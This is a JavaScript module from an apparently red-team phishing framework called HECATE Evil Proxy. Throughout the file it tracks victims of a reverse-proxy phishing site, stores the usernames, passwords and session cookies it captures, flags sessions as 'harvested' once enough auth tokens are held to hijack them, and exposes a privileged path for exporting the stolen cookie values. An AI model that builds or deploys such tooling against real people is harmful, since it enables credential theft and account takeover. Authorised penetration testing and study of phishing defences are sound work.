'use strict';

/**
 * HECATE Evil Proxy — Session Monitor
 * Tracks victim sessions throughout the phishing lifecycle.
 *
 * Session states:
 *   active     — victim is browsing the phished site
 *   auth       — victim has hit an authUrl (auth in progress)
 *   harvested  — all required auth tokens captured (session hijackable)
 *   expired    — no activity for inactivityMs
 *
 * One VictimSession per (lureId + victimSid) pair.
 * Multiple sessions can exist for the same lure (different victims).
 */

const { isSessionComplete } = require('./cookie-jar');

const INACTIVITY_MS    = 10 * 60 * 1000;  // 10 minutes
const CLEANUP_INTERVAL = 60 * 1000;       // check every minute

// Map<sessionKey, VictimSession>
const sessions = new Map();

let cleanupTimer = null;
let _eventBus    = null;

function setEventBus(bus) { _eventBus = bus; }

function _key(lureId, victimSid) { return `${lureId}:${victimSid}`; }

/**
 * Get or create a session for a victim.
 * @param {string} lureId
 * @param {string} victimSid     - from the _hcte cookie
 * @param {string} engagementId
 * @param {object} phishlet      - normalised phishlet
 */
function getOrCreate(lureId, victimSid, engagementId, phishlet) {
  const key = _key(lureId, victimSid);

  if (sessions.has(key)) {
    const s = sessions.get(key);
    s.lastSeen = Date.now();
    return s;
  }

  const session = {
    key,
    lureId,
    victimSid,
    engagementId,
    phishletName:     phishlet.name,
    state:            'active',
    capturedCookies:  [],           // CapturedCookie[]
    capturedCredentials: {},        // { username, password, ... }
    visitedUrls:      [],
    userAgent:        null,
    ip:               null,
    createdAt:        Date.now(),
    lastSeen:         Date.now(),
    harvestedAt:      null,
    _phishlet:        phishlet,     // for isSessionComplete checks
  };

  sessions.set(key, session);
  _emit('evil-proxy:session_created', { lureId, victimSid, engagementId });
  return session;
}

/**
 * Record a page visit.
 */
function recordVisit(lureId, victimSid, url) {
  const s = sessions.get(_key(lureId, victimSid));
  if (!s) return;
  s.lastSeen = Date.now();
  if (!s.visitedUrls.includes(url)) s.visitedUrls.push(url);
  if (s.state === 'active') _emit('evil-proxy:page_visited', { lureId, victimSid, url });
}

/**
 * Record captured cookies. Checks if session is now complete.
 */
function recordCookies(lureId, victimSid, cookies) {
  const s = sessions.get(_key(lureId, victimSid));
  if (!s || s.state === 'harvested') return;

  s.lastSeen = Date.now();

  for (const c of cookies) {
    // Avoid duplicate captures of the same cookie
    const exists = s.capturedCookies.some(e => e.name === c.name && e.value === c.value);
    if (!exists) {
      s.capturedCookies.push(c);
      _emit('evil-proxy:cookie_captured', {
        lureId, victimSid, cookieName: c.name, domain: c.domain
      });
    }
  }

  // Check completion
  const names  = s.capturedCookies.map(c => c.name);
  const result = isSessionComplete(names, s._phishlet.authTokens);

  if (result.complete && s.state !== 'harvested') {
    s.state       = 'harvested';
    s.harvestedAt = Date.now();
    _emit('evil-proxy:session_harvested', {
      lureId, victimSid,
      engagementId:  s.engagementId,
      phishletName:  s.phishletName,
      cookieCount:   s.capturedCookies.length,
      hasCredentials: Object.keys(s.capturedCredentials).length > 0,
    });
  }
}

/**
 * Record captured credentials.
 */
function recordCredentials(lureId, victimSid, credentials) {
  const s = sessions.get(_key(lureId, victimSid));
  if (!s) return;

  s.lastSeen = Date.now();
  Object.assign(s.capturedCredentials, credentials);

  if (s.state === 'active') s.state = 'auth';

  _emit('evil-proxy:credentials_captured', {
    lureId, victimSid,
    keys: Object.keys(credentials),
    engagementId: s.engagementId,
  });
}

/**
 * Get a session.
 */
function get(lureId, victimSid) {
  return sessions.get(_key(lureId, victimSid)) ?? null;
}

/**
 * List all sessions, optionally filtered.
 */
function list({ lureId, state, engagementId } = {}) {
  return [...sessions.values()].filter(s => {
    if (lureId      && s.lureId      !== lureId)      return false;
    if (state       && s.state       !== state)       return false;
    if (engagementId && s.engagementId !== engagementId) return false;
    return true;
  }).map(safeView);
}

/** Strip _phishlet internals for API responses */
function safeView(s) {
  const { _phishlet, ...rest } = s;
  return {
    ...rest,
    cookieCount: rest.capturedCookies.length,
    // Never expose actual cookie values via the list API — require explicit retrieve
    capturedCookies: rest.capturedCookies.map(c => ({
      name: c.name, domain: c.domain, capturedAt: c.capturedAt
    })),
  };
}

/**
 * Get full session including cookie values (for credential export).
 * This is the privileged retrieve path — audit logged by result-writer.
 */
function getPrivileged(lureId, victimSid) {
  return sessions.get(_key(lureId, victimSid)) ?? null;
}

function stats() {
  const all    = [...sessions.values()];
  const byState = {};
  for (const s of all) byState[s.state] = (byState[s.state] ?? 0) + 1;
  return { total: all.length, byState };
}

function startCleanup() {
  if (cleanupTimer) return;
  cleanupTimer = setInterval(() => {
    const now    = Date.now();
    const cutoff = now - INACTIVITY_MS;
    for (const [key, s] of sessions) {
      if (s.state !== 'harvested' && s.lastSeen < cutoff) {
        s.state = 'expired';
        sessions.delete(key);
      }
    }
  }, CLEANUP_INTERVAL).unref();
}

function stopCleanup() {
  if (cleanupTimer) { clearInterval(cleanupTimer); cleanupTimer = null; }
}

function clear() { sessions.clear(); }

function _emit(event, data) {
  _eventBus?.emit(event, { ...data, ts: new Date().toISOString() });
}

module.exports = {
  setEventBus,
  getOrCreate, recordVisit, recordCookies, recordCredentials,
  get, list, getPrivileged, stats,
  startCleanup, stopCleanup, clear,
};
